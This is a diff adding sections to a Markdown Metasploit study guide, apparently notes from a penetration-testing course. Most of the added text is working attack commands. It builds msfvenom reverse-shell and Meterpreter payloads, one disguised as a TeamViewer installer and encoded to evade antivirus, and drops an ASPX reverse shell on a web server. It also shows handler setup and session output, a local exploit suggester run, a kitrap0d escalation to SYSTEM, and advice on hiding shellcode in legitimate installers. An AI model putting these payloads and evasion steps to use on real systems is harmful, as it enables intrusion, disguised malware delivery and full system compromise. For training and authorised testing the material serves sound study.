@@ -7,13 +7,13 @@
 <details>
 <summary><h2>⚠️ Warnings to the Seeker of Shrouded Truth ⚠️</h2></summary>
 
-**Do not get tunnel vision.**
+* **Do not get tunnel vision.**
 > *Beware the madness that comes from gazing too long into a single artifact. The Framework is but one relic among many—do not let it become your crutch or your altar. Use it with intent, not dependence.*
 
-**Please read all the technical documentation you can find for any of our tools.**
+* **Please read all the technical documentation you can find for any of our tools.**
 > *Before invoking forgotten runes, one must study the glyphs etched in the margins of the old tomes. Knowledge is the warding circle that keeps the daemon in the cage. Read. Absorb. Comprehend.*
 
-**Many tools can prove to be unpredictable.**
+* **Many tools can prove to be unpredictable.**
 > *Every incantation comes with a price. Some conjurations may awaken watchers, leaving ghostly footprints across the target's domain. Others may tear open rifts in your own sanctum. Always proceed with wards in place and a retreat mapped.*
 
 </details>
@@ -219,7 +219,7 @@ msf6 > setg LHOST <ATTACKER IP>
 **Attacker Port Specification**
 
 ```bash
-msf6 > set LPORT <ATTACKER PORT>
+msf6 > set LPORT 4444
 ```  
 
 </details>
@@ -419,25 +419,25 @@ Encoders were packed separately from the msfconsole script and were called **msf
 **Generating Payload - Without Encoding**
 
 ```bash
-msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<ATTACKER IP> LPORT=<ATTACKER PORT> -b "\x00" -f perl
+msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<ATTACKER IP> LPORT=4444 -b "\x00" -f perl
 ```  
 
 **Generating Payload - With Encoding**
 
 ```bash
-msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<ATTACKER IP> LPORT=<ATTACKER PORT> -b "\x00" -f perl -e x86/shikata_ga_nai
+msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<ATTACKER IP> LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
 ```  
 
 **Generate a payload with the exe format, called TeamViewerInstall.exe**  
 
 ```bash
-msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER IP> LPORT=<ATTACKER PORT> -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER IP> LPORT=4444 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe
 ```  
 
 **Generate a payload with the exe format, called TeamViewerInstall.exe running it through multiple iterations**  
 
 ```bash
-msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER IP> LPORT=<ATTACKER PORT> -e x86/shikata_ga_nai -f exe -i 10 -o ./TeamViewerInstall.exe
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER IP> LPORT=4444 -e x86/shikata_ga_nai -f exe -i 10 -o ./TeamViewerInstall.exe
 ```  
 
 As anticipated, most commercial antivirus solutions can detect these payloads during real-world engagements. Therefore, additional evasion techniques become necessary to bypass modern endpoint protection systems.
@@ -1109,14 +1109,145 @@ msf6 > search type:exploit <module_name>
 <details>
 <summary><h3>Introduction to MSFVenom</h3></summary>
 
-Text
+MSFVenom replaces the legacy MSFPayload and MSFEncode utilities, combining their functionality into a single powerful tool. As the modern payload generation framework for Metasploit, it enables security professionals to craft highly customizable and evasive payloads while maintaining full integration with msfconsole for exploit delivery.
+
+<details>
+<summary><h4>Creating Our Payloads</h4></summary>
+
+**Generating Payload**
+
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER IP> LPORT=4444 -f aspx > reverse_shell.aspx
+``` 
+
+**MSF - Setting Up Multi/Handler**  
+
+```bash
+msfconsole -q 
+
+msf6 > use multi/handler
+msf6 exploit(multi/handler) > show options
+msf6 exploit(multi/handler) > set LHOST <ATTACKER IP>
+msf6 exploit(multi/handler) > set LPORT 4444
+msf6 exploit(multi/handler) > run
+``` 
+
+**Executing the Payload**
+
+_Navigate to the upload path_ (e.g. http://TARGET/reverse_shell.aspx)
+
+**MSF - Meterpreter Shell**
+
+```bash
+# [*] Started reverse TCP handler on <ATTACKER IP>:4444 
+
+# [*] Sending stage (176195 bytes) to <TARGET IP>
+# [*] Meterpreter session 1 opened (<ATTACKER IP>:4444 -> <TARGET IP>:<TARGET PORT>) at 2020-08-28 16:33:14 +0000
+
+
+meterpreter > getuid
+
+# Server username: IIS APPPOOL\Web
+``` 
+
+**Executing the Payload**
+
+```bash
+meterpreter > background
+
+msf6 > search local exploit suggester
+
+msf6 > use post/multi/recon/local_exploit_suggester
+
+msf6 post(multi/recon/local_exploit_suggester) > show options
+
+msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
+
+msf6 post(multi/recon/local_exploit_suggester) > run
+
+# [*] <TARGET IP> - Collecting local exploits for x86/windows...
+# [*] <TARGET IP> - 31 exploit checks are being tried...
+# [+] <TARGET IP> - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+# [+] <TARGET IP> - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
+# [+] <TARGET IP> - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
+# [+] <TARGET IP> - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
+# [+] <TARGET IP> - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
+# [+] <TARGET IP> - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+# [+] <TARGET IP> - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
+# [+] <TARGET IP>\ - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+# [+] <TARGET IP>\ - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
+# [+] <TARGET IP>\ - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
+# [+] <TARGET IP>\ - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
+# [+] <TARGET IP>\ - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+# [*] Post module execution completed
+``` 
+
+**MSF - Local Privilege Escalation**
+
+```bash
+msf6 exploit(multi/handler) > search kitrap0d
+
+msf6 exploit(multi/handler) > use exploit/windows/local/ms10_015_kitrap0d
+
+msf6 exploit(windows/local/ms10_015_kitrap0d) > show options
+
+msf6 exploit(windows/local/ms10_015_kitrap0d) > set LPORT 4445
+
+msf6 exploit(windows/local/ms10_015_kitrap0d) > set SESSION 2
+
+msf6 exploit(windows/local/ms10_015_kitrap0d) > run
+
+# [*] Started reverse TCP handler on <ATTACKER IP>:4445 
+# ...
+# [*] Meterpreter session 4 opened (<ATTACKER IP>:4445 -> <TARGET IP>:<TARGET PORT>) at 2020-08-28 17:15:56 +0000
+
+meterpreter > getuid
+
+# Server username: NT AUTHORITY\SYSTEM
+
+``` 
+
+</details>
 
 </details>
 
 <details>
 <summary><h3>Firewall and IDS/IPS evasion</h3></summary>
 
-Text
+<details>
+<summary><h4>Terms</h4></summary>
+
+To better learn how we can efficiently and quietly attack a target, we first need to understand better how that target is defended. We are introduced to two new terms:
+
+* **Endpoint protection:** Endpoint protection refers to any localized device or service whose sole purpose is to protect a single host on the network. The host can be a personal computer, a corporate workstation, or a server in a network's De-Militarized Zone (DMZ).
+
+
+* **Security Policies:** They are essentially a list of allow and deny statements that dictate how traffic or files can exist within a network boundary. These lists can also target different features of the network and hosts, depending on where they reside:
+
+    * Network Traffic Policies
+    * Application Policies
+    * User Access Control Policies
+    * File Management Policies
+    * DDoS Protection Policies
+    * Others
+
+There are multiple ways to match an event or object with a security policy entry:
+
+| Security Policy                          | Description |
+|------------------------------------------|-------------|
+| **Signature-based Detection**            | The operation of packets in the network and comparison with pre-built and pre-ordained attack patterns known as signatures. Any 100% match against these signatures will generate alarms. |
+| **Heuristic / Statistical Anomaly Detection** | Behavioral comparison against an established baseline, including modus-operandi signatures for known APTs (Advanced Persistent Threats). The baseline identifies the norm for the network and common protocols. Any deviation from the maximum threshold generates alarms. |
+| **Stateful Protocol Analysis Detection** | Recognizing the divergence of protocols by comparing events against pre-built profiles of generally accepted definitions of non-malicious activity. |
+| **Live-monitoring and Alerting (SOC-based)** | A team of analysts in a dedicated (in-house or leased) SOC (Security Operations Center) uses live-feed software to monitor network activity and intermediate alarming systems for potential threats. They decide whether to act on threats or let automated mechanisms respond. |
+
+</details>
+
+<details>
+<summary><h4>Evasion Techniques</h4></summary>
+
+We can embed the shellcode into any installer, package, or program that we have at hand, hiding the payload shellcode deep within the legitimate code of the actual product. This greatly obfuscates our malicious code and, more importantly, lowers our detection chances.
+
+</details>
 
 </details>
 
